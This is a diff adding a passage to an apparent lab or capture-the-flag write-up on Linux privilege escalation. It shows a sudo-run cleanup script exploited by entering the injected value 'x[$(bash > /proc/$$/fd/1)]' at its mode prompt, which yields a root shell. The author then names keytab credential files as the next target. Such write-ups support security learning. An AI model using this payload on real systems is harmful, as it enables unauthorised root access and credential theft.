@@ -899,3 +899,24 @@ I can read/execute this script, i cant write to it!
 
 I handed this script to AI and i found a vulnerability at the bottom of the code
 
+```python
+points@ip-10-0-20-54:~$ sudo /opt/routine_cleanup.sh 
+Routine Cleanup Utility
+Host: ip-10-0-20-54
+Operator: root
+Timestamp: 2026-08-05 18:21:23
+
+Available cleanup modes:
+  1) Temp artifact cleanup
+  2) Cache artifact cleanup
+  3) Report generation and empty-directory prune
+
+Select mode: x[$(bash > /proc/$$/fd/1)]
+
+root@ip-10-0-20-54:/home/points# whoami
+root
+root@ip-10-0-20-54:/home/points# 
+```
+
+With the help of some research and AI i managed to spawn a root shell, my first instinct is to go for keytab files!
+
